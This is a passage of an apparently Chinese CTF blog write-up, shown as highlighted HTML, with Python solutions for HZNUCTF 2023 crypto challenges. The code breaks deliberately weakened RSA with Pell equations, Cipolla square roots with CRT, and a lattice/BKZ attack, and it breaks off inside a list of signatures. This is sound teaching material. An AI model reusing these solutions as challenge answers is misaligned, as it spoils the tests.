class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">return</span> numer<span class=\"token punctuation\">,</span> denom</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>N <span class=\"token operator\">=</span> b<span class=\"token operator\">//</span>a</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>x<span class=\"token punctuation\">,</span>y <span class=\"token operator\">=</span> solve_pell<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hznuctf-2023-finalcheckin\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-finalcheckin\">#</a> [HZNUCTF 2023 final]checkin</h2>\n<p>费马小定理推导一下分解 n，然后<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybmJsb2NrY2hhaW4uY24vYXJ0aWNsZS8xNTIw\"> Cipolla 算法</span>解 e 为 2 的若干次方的情况。这里记一下板子：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sympy<span class=\"token punctuation\">.</span>ntheory<span class=\"token punctuation\">.</span>modular <span class=\"token keyword\">import</span> crt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">22114546923564420607945063747927422619774890007937503484905798897563036431278699718161460968350749338680452479484253816646632515078192048118109272532310403715802657061990320170724360874028667484527150185159662403573637809180151665727445208585725264186578429094937215068881079399747998551453944363665401263</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">7274219309267176700435453490636404568410293850833252412471984274955007037941820465929958008672185817002749418809077052781794306899476543760452010370102811167685901654480233874375880047900499814304539829706786470978714629827690730256369200773772396109793338097451559255985268375731804819829315168807228186</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">1463929459818798711929811606552273520156490689917243949474579232718301828387871678397965433435537694532920957475947201372279363554005600100100224291888130</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>hint <span class=\"token operator\">=</span> <span class=\"token number\">5610276127312766429915480651516095336201056367031530733662980757514427535721885723009367286870294772595629284861923351543396909892645845139050780691701736</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24000</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>hint <span class=\"token operator\">+</span> <span class=\"token number\">2022</span><span class=\"token operator\">*</span><span class=\"token number\">2024</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">2024</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>q</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">assert</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">square_root_of_quadratic_residue</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> modulo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"Square root of quadratic residue</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    Solve the square root of quadratic residue using Cipolla's algorithm with Legendre symbol</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    Returns:</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        int -- if n is a quadratic residue,</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                   return x, such that x^&#123;2&#125; = n (mod modulo)</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>               otherwise, return -1</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> modulo <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> modulo <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    Legendre <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> n<span class=\"token punctuation\">:</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> modulo <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> modulo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> Legendre<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> modulo <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">while</span> Legendre<span class=\"token punctuation\">(</span>t <span class=\"token operator\">**</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> modulo <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        t <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    w <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">**</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulo</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>generate_quadratic_field<span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">,</span> modulo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">**</span> <span class=\"token punctuation\">(</span>modulo <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>x</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_quadratic_field</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> modulo<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"Generate quadratic field number class</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    Returns:</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        class -- quadratic field number class</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">#assert (isinstance(modulo, int) and modulo >= 0)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name\">QuadraticFieldNumber</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> x <span class=\"token operator\">%</span> modulo</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> y <span class=\"token operator\">%</span> modulo</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">__mul__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> another<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            x <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> another<span class=\"token punctuation\">.</span>x <span class=\"token operator\">+</span> d <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">*</span> another<span class=\"token punctuation\">.</span>y</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            y <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">*</span> another<span class=\"token punctuation\">.</span>y <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>y <span class=\"token operator\">*</span> another<span class=\"token punctuation\">.</span>x</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">__pow__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> exponent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            result <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token keyword\">if</span> exponent<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                temporary <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token keyword\">while</span> exponent<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    <span class=\"token keyword\">if</span> exponent <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                        result <span class=\"token operator\">*=</span> temporary</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                    temporary <span class=\"token operator\">*=</span> temporary</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                    exponent <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'(&#123;&#125;, &#123;&#125; \\\\sqrt(&#123;&#125;))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">return</span> QuadraticFieldNumber</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>res1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>total <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>res2 <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">24000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    tmp<span class=\"token punctuation\">,</span> res1 <span class=\"token operator\">=</span> res1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">for</span> ct <span class=\"token keyword\">in</span> tmp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        mm <span class=\"token operator\">=</span> square_root_of_quadratic_residue<span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token keyword\">if</span> mm <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> total<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>            total<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>mm<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">if</span> p<span class=\"token operator\">-</span>mm <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> total<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            total<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span>mm<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        <span class=\"token keyword\">if</span> mm <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token keyword\">or</span> mm <span class=\"token operator\">==</span> p <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token keyword\">or</span> mm <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        res1 <span class=\"token operator\">+=</span> <span class=\"token punctuation\">[</span>mm<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-</span>mm<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    res1 <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>res1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>res1 <span class=\"token operator\">=</span> res1<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>res2 <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">24000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    res2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>res2<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>res2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>res2<span class=\"token punctuation\">,</span> p <span class=\"token operator\">-</span> res2<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> res2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        m <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'HZNU'</span> <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hznuctf-2023-finalnothing\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-finalnothing\">#</a> [HZNUCTF 2023 final]nothing</h2>\n<p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjI2MjMyL2FydGljbGUvZGV0YWlscy8xMjk5NjQwMzg=\">无趣的浅</span>，格子都一样，这里顺便替他把格子改为 1 的那种形式，试了试 bkz，果然秒出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sigs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'0299f768be70f857f72b2f51ff1ea9c6a4150fc327d833f309cc4785e24e02e3da6eb00040d332a485055d5e4e1f100f11b5af7193fa0f563558198234493961'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'56d69878a81b614df64df2dcba2ebafbedab1bbda6fc08fd284c513caff0d8c212989c49412bd07c45d28fa08f5d18db620ccb92a044c67dc0791b3b011674cb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'30d04db3ad528f895fb6693a5e04485cf66ebe05cc52af8816716540f19b72f2a2197e783c620a385a16cb8997721499cc4aa768616ca15d2db0f9fca8fd4cdb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'8da002a89caf9202d049992908261b71711b0961755374f3e0e7ce75808804e1f5c2e6cc16e98717af044a07094e48c4f99ddc3fbd980e5dce5bd383cab5933a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'eb4ad94b8473ebe0f574ca9fd15a9e58feb26fc7b9a009c4659f018506e4c008f1ddb3a18fae3edbc7764e2f9fce69bac710aceff99b23d5d438242d36be9d69'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'309bc1d88c74fffada98cc9894686d128498c2442d19d884a2567377aa3cd48fe3d965e3c8aa08b8b76ffd0e767b4c0021616df8dc841558b1a5a0c70bccbead'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bff192d180050f161d739e73d5cb8885a5e2f14a218242d7fe7c1ac41ab6cb2a0b3beb1382280a08485657b1a0f739e87dad40173f7e2540049cbf1ec0a447e7'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ab5b182c463193088e05d93d434b6bc85520b786c6d6d1bcb5e64d456611f94beb7851d9b8c9b0ef90c3b998e1513c6300a02e0116eb494bc08afb47a20f452d'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1dabd46bd2d6140d44a30755e704874c680d7c0dcfec873f552ae59e7507e287c5f78dd3a3c06a4cecd793dac7308943d4c8a7c67bcad9b3413429ccbab194d2'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f963717351045558d74a1a9412a4077216472fd4e8bc9a9ca58bef7d04bdb242e7c01c322250482a2389a2e78b26d0576c1268a5d8075b2a64948629e40a8b4b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'7b5a09b1e6c56b045833bf29d270c4a9bf4b1bfc247bffb2a61593f42d041166c5a930a8859aa4d1974df71eac43b4901bd7850965620fbce4cfc14990e9ec3d'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'9633edc09d43d120c14afda218ecc55c8dfe1ba300811179d64b18f8b42eb8864a31252329c2cc3b19a4c0aa617fc14904c10c0f8ec5733c5d495ccf337e00d3'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f2cfe285bbff01789cd891c3aca036af4fb54fb9a65e76184c6cf5543772725b6c7d7db615457662da09136d8318028f2cb5b47296390d3c4381f9e9f75fb05c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'cf6780d28db3611cbc7aa9f161f2a709fbbd29983be59ccb97631549ac2a929fe4924a4cd923c2e48db95d7bc4fac45bf537d6f13b3d8348f7b94ecc11c03854'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'50323cfc4beda4f2542c9e509bb043ecc6aa8a898915db8e907843bb56a080d8a52929340fb56b5de43f956dd1173120b88c5c8718297d7d633469c5dc0f8ed9'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b143d8f36fc56cfb0467dd54af9ce8bffdac3bb5b8aa1df7290a7f4ff632f834fb38917b1f02a82f50a9e7663ba8ec26357fded3ea7870bb463ac219b7a04cf9'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'8a5450ca4d771dd63e974de33fcaedad6e53f94fb92d251dfba62c7121d27d6294d986325880d46cee0250a4a56558bb2fd7aa619bb0309b4c65b3cf11f6d4aa'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'3ae81196d24fc740348dba4e03a5bc45a75d9fe41f52160870631b0ab3a71f9c63aa4cc247e2f285cf4803c564413283694fc3a75a673aa4f54374f1460e7421'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a409b15c00793d88435bc31f538d318b69f66bb029c13a5ce298ede2db788cfa5dc39473f13417bdde338e509e85781cdfe54168d26a03fb35438b917506c24c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0d12d48fdbce87d9584c1355f9fc3610db77e8df7514bd80479fa12fc960da39865d745ec49e266ac0ac3a7ce330c7cf406c9d124feefd8cc927e68f64155a0f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'3dd63eb496f64e61ca687c3daf437bc31f0b563b51bd4eded71d6eeb56d25089c4e2b09250984271d7a69540c4b39d70127ea38e3c126c35baa94aae92281a08'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'38c9571625b7da8aaef69e21a1d225082e4772a0cf5d3c23f3e783c529adef1469588302e91a8c44511f037b5b3aeffa60dab7ff1b5900ec35431a9f846baa74'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a8b7adda8626a880394b7c47142558ff113c8d7f7c69dfc562a5ad7a3ffd6692f2d7a4f4ef19404c5a4a1f80817a2f7fd0e6fa277418610ef2d2d6b97346b2e7'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a86a30d05909d45683c0745102c095459582d8273e7f69d0f42b11511ec53a498ce6a5572698efaf632f4da2435b512ae97908d00052194f89ed1921c5a5e9da'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1c3371ed8aa9f914f71276eee3fd25cbd87780a68ef724ed28842bc83e0d02ef5867c3264563197c27bb1e5ec2ffd634e32b720c4f6d5725300350b8d5cca2d5'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f064b874158ff296e07f75def08c63884fcca93fa2bc018c607736614bcab3e2f692d9b52ed106b8abf68eb564ba999c5fa094967f10630014f2c583e4db107b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'e5e37d9857e638cc41af7bf75280108b2f86f64617e21057e246102262b0eebb20307f7f359375761bbd366b7e9c1c9914623f200098e713730b6160d09bd0cb'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bc18436538ab7bcf1789fcbe58f860c5ee9c779a6ea465531febb6f50b57e71b74d2ea9e664739225c0979e8ff77f189c50f5872f5c5a4c042d21b49f3e995f1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b45968deda83d9f42a255d627b53a01c5e665b39d67d7516f4a7ad703be810df3fae0374a1ef30f1da8ac87e5b86694882c1cd14cf69dd56b3689b84160aeb5a'</span><span class=\"token punctuation\">,</span> <span class=\"token 